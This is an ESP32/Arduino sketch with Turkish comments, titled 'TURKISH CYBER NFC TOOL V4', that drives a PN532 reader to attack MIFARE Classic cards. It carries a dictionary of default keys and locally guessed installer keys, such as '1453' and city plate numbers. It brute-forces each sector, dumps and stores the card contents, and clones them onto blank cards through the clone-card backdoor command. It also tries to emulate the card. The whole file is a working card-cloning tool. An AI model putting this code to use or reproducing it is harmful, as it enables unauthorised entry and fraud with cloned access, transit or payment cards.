#include <Arduino.h>
#include <SPIFFS.h>
#include <PN532_HSU.h>
#include <PN532.h>

// --- BAĞLANTILAR ---
// Elechouse V3 PN532 -> ESP32
// TX  -> GPIO 16 (RX2)
// RX  -> GPIO 17 (TX2)
// DIP SWITCH: OFF - OFF

PN532_HSU pn532_hsu(Serial2);
PN532 nfc(pn532_hsu);

// --- BELLEK YAPISI ---
struct CardProfile {
  byte uid[7];
  byte uidLen;
  byte data[1024]; 
  byte sectorKeys[16][6]; 
  bool sectorSolved[16];  
};

CardProfile activeCard;

// --- GENİŞLETİLMİŞ SÖZLÜK (GLOBAL) ---
const int TOTAL_KEYS = 50; 
// PROGMEM kullanarak RAM tasarrufu yapıyoruz (Büyük listeler için)
const byte keys[TOTAL_KEYS][6] = {
  // --- KÜRESEL STANDARTLAR ---
  {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, // Fabrika (En Yaygın)
  {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5}, // NXP MAD
  {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}, // NFC Forum
  {0x00,0x00,0x00,0x00,0x00,0x00}, // Boş
  {0xA1,0xA2,0xA3,0xA4,0xA5,0xA6},
  {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5},
  {0x4D,0x3A,0x99,0xC3,0x51,0xDD},
  {0x1A,0x98,0x2C,0x7E,0x45,0x9A},
  {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF},
  {0x71,0x4C,0x5C,0x88,0x6E,0x97},
  {0x58,0x7E,0xE5,0xF9,0x35,0x0F},
  {0xA0,0x47,0x8C,0xC3,0x90,0x91},
  {0xA0,0xB0,0xC0,0xD0,0xE0,0xF0},
  {0xA1,0xB1,0xC1,0xD1,0xE1,0xF1},
  {0x12,0x34,0x56,0x78,0x9A,0xBC},
  {0x01,0x02,0x03,0x04,0x05,0x06},
  {0x10,0x20,0x30,0x40,0x50,0x60},
  {0x00,0x01,0x02,0x03,0x04,0x05},
  {0x12,0x12,0x12,0x12,0x12,0x12},
  {0xF0,0xF0,0xF0,0xF0,0xF0,0xF0},
  {0x0F,0x0F,0x0F,0x0F,0x0F,0x0F},
  {0x53,0x3C,0xB6,0xC7,0x23,0xF6},
  {0x8F,0xD0,0xA4,0xF2,0x56,0xE9},
  
  // --- BASİT DESENLER (Çin Malı Sistemler) ---
  {0x11,0x11,0x11,0x11,0x11,0x11},
  {0x22,0x22,0x22,0x22,0x22,0x22},
  {0x33,0x33,0x33,0x33,0x33,0x33},
  {0x44,0x44,0x44,0x44,0x44,0x44},
  {0x55,0x55,0x55,0x55,0x55,0x55},
  {0x66,0x66,0x66,0x66,0x66,0x66},
  {0x77,0x77,0x77,0x77,0x77,0x77},
  {0x88,0x88,0x88,0x88,0x88,0x88},
  {0x99,0x99,0x99,0x99,0x99,0x99},

  // --- TÜRKİYE ÖZEL / YEREL MONTAJCI DESENLERİ ---
  {0x14,0x53,0x14,0x53,0x14,0x53}, // Fetih 1453 (Çok yaygın)
  {0x19,0x23,0x19,0x23,0x19,0x23}, // Cumhuriyet
  {0x34,0x34,0x34,0x34,0x34,0x34}, // Istanbul Plaka
  {0x06,0x06,0x06,0x06,0x06,0x06}, // Ankara Plaka
  {0x35,0x35,0x35,0x35,0x35,0x35}, // Izmir Plaka
  {0x01,0x01,0x01,0x01,0x01,0x01}, // Adana/Genel
  {0x63,0x63,0x63,0x63,0x63,0x63}, // Şanlıurfa (Kart Sistemlerinde Yaygın)
  {0x12,0x34,0x56,0x12,0x34,0x56}, // Tekrar Eden Sıralı
  {0x12,0x31,0x23,0x12,0x31,0x23}, // Klavye Deseni
  {0x20,0x23,0x20,0x23,0x20,0x23}, // Yıl Bazlı 1
  {0x20,0x24,0x20,0x24,0x20,0x24}, // Yıl Bazlı 2
  {0x20,0x25,0x20,0x25,0x20,0x25}, // Yıl Bazlı 3
  {0x11,0x22,0x33,0x44,0x55,0x66}, // Çiftli Sıra
  {0xAA,0xAA,0xAA,0xBB,0xBB,0xBB}, // Harf Tekrarı
  {0xAD,0xAD,0xAD,0xAD,0xAD,0xAD}, // Admin Kısaltması
  {0x12,0x34,0x56,0x65,0x43,0x21}, // Gidiş Dönüş
  {0x00,0x00,0x00,0xFF,0xFF,0xFF}  // Yarım Dolu
};

// Fonksiyonlar
void smartAnalyzeAndSave();    // [R] - YENİ ALGORİTMA
int findCardInDB(byte* uid, byte len);
void displayDataWithASCII(int sector, int block, byte* data);
bool tryKey(byte* uid, byte len, int sector, const byte* key); 
void verifyAndWrite();    // [W]
void emulateActiveCard(); // [E]
void deleteCard(int index);
void listCards();
void loadCardFromDisk(int index);
bool unlockBackdoor();

void setup() {
  Serial.begin(9600); // İSTEK ÜZERİNE 9600 BAUD
  delay(1000);
  Serial.println("\n--- TURKISH CYBER NFC TOOL V4 ---");
  Serial.println("Algoritma: Sector 0 First + Same Key Strategy");
  Serial.println("[R] Akilli Oku | [W] Klonla | [E] Taklit | [D] Sil | [L] Liste");

  if (!SPIFFS.begin(true)) Serial.println("SPIFFS Hatasi!");

  nfc.begin();
  if (!nfc.getFirmwareVersion()) { Serial.println("PN532 BULUNAMADI!"); while(1); }
  nfc.SAMConfig();
}

void loop() {
  if (Serial.available() > 0) {
    String str = Serial.readStringUntil('\n');
    str.trim(); str.toUpperCase();
    if (str.length() == 0) return;
    
    char cmd = str.charAt(0);
    int idx = str.length() > 1 ? str.substring(1).toInt() : -1;

    if (cmd == 'R') smartAnalyzeAndSave();
    else if (cmd == 'L') listCards();
    else if (cmd == 'W') { if(idx>=0){ loadCardFromDisk(idx); verifyAndWrite(); } else Serial.println("Orn: W0"); }
    else if (cmd == 'E') { if(idx>=0){ loadCardFromDisk(idx); emulateActiveCard(); } else Serial.println("Orn: E0"); }
    else if (cmd == 'D') { if(idx>=0) deleteCard(idx); }
  }
}

// --- [R] AKILLI ANALİZ ALGORİTMASI ---
void smartAnalyzeAndSave() {
  Serial.println("\n=== [R] AKILLI KIRMA MODU (TR) ===");
  Serial.println("Karti koyun ve bekleyin...");

  byte uid[7]; byte len;
  while (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 500)) { delay(50); }

  Serial.print("Kart Algilandi! UID: ");
  for(int i=0; i<len; i++) { Serial.print(uid[i], HEX); Serial.print(" "); }
  Serial.println();

  // 1. ÇİFT KAYIT KONTROLÜ
  int existingID = findCardInDB(uid, len);
  if (existingID != -1) {
    Serial.println("\n>>> BU KART ZATEN ID [" + String(existingID) + "]'DE KAYITLI! <<<");
    return;
  }

  // HAZIRLIK
  memset(&activeCard, 0, sizeof(CardProfile));
  memcpy(activeCard.uid, uid, len);
  activeCard.uidLen = len;

  Serial.println("----------------------------------------------------------------");
  Serial.println("STRATEJI: Once Sektor 0 kirilacak, sonra ayni sifre denenecek.");
  Serial.println("----------------------------------------------------------------");

  byte goldenKey[6] = {0}; // Eğer Sektor 0 çözülürse buraya kaydedeceğiz
  bool hasGoldenKey = false;

  // --- ADIM 1: SEKTÖR 0'I KIRMA (Tüm Anahtarlarla) ---
  Serial.print("Analiz: Sektor 0 araniyor... ");
  
  for (int k = 0; k < TOTAL_KEYS; k++) {
    if (tryKey(uid, len, 0, keys[k])) {
      Serial.println("[ BULUNDU ]");
      memcpy(goldenKey, keys[k], 6);
      memcpy(activeCard.sectorKeys[0], keys[k], 6);
      activeCard.sectorSolved[0] = true;
      hasGoldenKey = true;
      
      // Sektör 0 verisini hemen oku
      for (int b=0; b<4; b++) {
         nfc.mifareclassic_ReadDataBlock(b, &activeCard.data[b*16]);
      }
      break; // Bulduk, döngüden çık
    }
  }

  if (!hasGoldenKey) {
    Serial.println("[ BULUNAMADI ] -> Standart taramaya geciliyor.");
  } else {
    Serial.print("Golden Key: ");
    for(int i=0; i<6; i++) { Serial.print(goldenKey[i], HEX); }
    Serial.println(" -> Tum sektorlerde deneniyor...");
  }

  // --- ADIM 2: DİĞER SEKTÖRLERİ TARAMA ---
  for (int s = 1; s < 16; s++) { // Sektör 1'den başla
    bool cracked = false;

    // STRATEJİ A: Önce Golden Key dene (Varsa)
    if (hasGoldenKey) {
      if (tryKey(uid, len, s, goldenKey)) {
        memcpy(activeCard.sectorKeys[s], goldenKey, 6);
        activeCard.sectorSolved[s] = true;
        cracked = true;
        // Hız kazandık! Sözlüğü taramaya gerek kalmadı.
      }
    }

    // STRATEJİ B: Eğer Golden Key yoksa veya tutmadıysa -> Full Sözlük Tara
    if (!cracked) {
      for (int k = 0; k < TOTAL_KEYS; k++) {
        if (tryKey(uid, len, s, keys[k])) {
          memcpy(activeCard.sectorKeys[s], keys[k], 6);
          activeCard.sectorSolved[s] = true;
          cracked = true;
          break; 
        }
      }
    }

    // SONUÇLARI İŞLE
    if (cracked) {
      // Veriyi Oku ve Ekrana Bas
      for (int b = 0; b < 4; b++) {
        int blk = (s*4)+b;
        nfc.mifareclassic_ReadDataBlock(blk, &activeCard.data[blk*16]);
        displayDataWithASCII(s, blk, &activeCard.data[blk*16]);
      }
    } else {
      Serial.print("  "); Serial.print(s); 
      Serial.println("  | ??? | -- KILITLI (Sifre bulunamadi) --    | ?????");
    }
  }

  // KAYDETME
  int newID = 0;
  while(SPIFFS.exists("/card_"+String(newID)+".bin")) newID++;
  
  File f = SPIFFS.open("/card_" + String(newID) + ".bin", "w");
  f.write((byte*)&activeCard, sizeof(CardProfile));
  f.close();

  Serial.println("----------------------------------------------------------------");
  Serial.print(">>> KAYIT BASARILI! Yeni ID: [ "); Serial.print(newID); Serial.println(" ] <<<");
}

// --- YARDIMCI FONKSİYONLAR ---
bool tryKey(byte* uid, byte len, int sector, const byte* key) {
  // Const byte* kullandık çünkü array'den geliyor
  return nfc.mifareclassic_AuthenticateBlock(uid, len, sector * 4, 0, (uint8_t*)key);
}

void displayDataWithASCII(int sector, int block, byte* data) {
  if(sector < 10) Serial.print("  "); else Serial.print(" ");
  Serial.print(sector); Serial.print(" | ");
  if(block < 10) Serial.print(" ");
  Serial.print(block); Serial.print("  | ");

  for(int i=0; i<16; i++) {
    if(data[i] < 0x10) Serial.print("0");
    Serial.print(data[i], HEX); Serial.print(" ");
  }
  Serial.print("| ");

  for(int i=0; i<16; i++) {
    char c = data[i];
    if (c >= 32 && c <= 126) Serial.print(c);
    else Serial.print(".");
  }
  Serial.println();
}

int findCardInDB(byte* uid, byte len) {
  int id = 0;
  while(1) {
    String fname = "/card_" + String(id) + ".bin";
    if(!SPIFFS.exists(fname)) break;
    File f = SPIFFS.open(fname, "r");
    if(f) {
      CardProfile temp;
      f.read((byte*)&temp, sizeof(CardProfile));
      f.close();
      
      // İçerik Kontrolü (Random UID için)
      bool match = true;
      bool isZero = true; 
      for(int i=0; i<16; i++) if(activeCard.data[64+i] != 0) isZero = false; // Block 4 kontrol
      
      if(!isZero) {
        if(memcmp(&temp.data[64], &activeCard.data[64], 16) != 0) match = false;
      } else {
        // Kart boşsa veya okunamadıysa sadece UID bak
        if(temp.uidLen != len || memcmp(temp.uid, uid, len) != 0) match = false;
      }
      
      if(match) return id;
    }
    id++;
  }
  return -1;
}

// --- DİĞER STANDART FONKSİYONLAR (Kopyalama/Silme vs.) ---
void deleteCard(int index) {
  if(SPIFFS.remove("/card_"+String(index)+".bin")) Serial.println("Silindi.");
  else Serial.println("Hata.");
}

void listCards() {
  Serial.println("\n--- VERITABANI ---");
  int i=0;
  while(i<100) {
    if(SPIFFS.exists("/card_"+String(i)+".bin")) {
      Serial.print("ID [ "); Serial.print(i); Serial.println(" ] - Kayitli");
    }
    i++;
  }
}

void loadCardFromDisk(int index) {
  String n = "/card_" + String(index) + ".bin";
  if(!SPIFFS.exists(n)) { Serial.println("Gecersiz ID"); return; }
  File f = SPIFFS.open(n, "r");
  f.read((byte*)&activeCard, sizeof(CardProfile));
  f.close();
  Serial.println("Yuklendi.");
}

void verifyAndWrite() {
  Serial.println("Bos karti koyun...");
  byte uid[7]; byte len;
  while (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 500)) {}
  unlockBackdoor();
  uint8_t k[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  if(nfc.mifareclassic_AuthenticateBlock(uid,len,0,0,k)) nfc.mifareclassic_WriteDataBlock(0, &activeCard.data[0]);
  nfc.inListPassiveTarget(); nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 100);
  for(int s=1; s<16; s++) {
    if(!activeCard.sectorSolved[s]) continue;
    if(nfc.mifareclassic_AuthenticateBlock(uid,len,s*4,0,k)) {
      for(int b=0; b<3; b++) nfc.mifareclassic_WriteDataBlock((s*4)+b, &activeCard.data[(s*4+b)*16]);
    }
  }
  Serial.println("Yazma Tamam.");
}

void emulateActiveCard() {
  Serial.println("Emulasyon Baslatildi...");
  byte cmd[] = {0x00, 0x04, 0x00, activeCard.uid[0], activeCard.uid[1], activeCard.uid[2], 0x20};
  nfc.setPassiveActivationRetries(0xFF);
  while(1) {
    if(nfc.tgInitAsTarget(cmd, sizeof(cmd)) == 1) {
      uint8_t b[255]; uint8_t l=sizeof(b);
      if(nfc.tgGetData(b, l) > 0) {
        Serial.println(">> TELEFON BAGLANDI! <<");
        uint8_t r[]={0x00}; nfc.tgSetData(r,1);
        delay(100);
      }
    }
    delay(20);
  }
}

bool unlockBackdoor() {
  byte u[]={0x43}; byte r[32]; uint8_t l=32;
  return (nfc.inDataExchange(u,1,r,&l) && l>0 && r[0]==0x0A);
}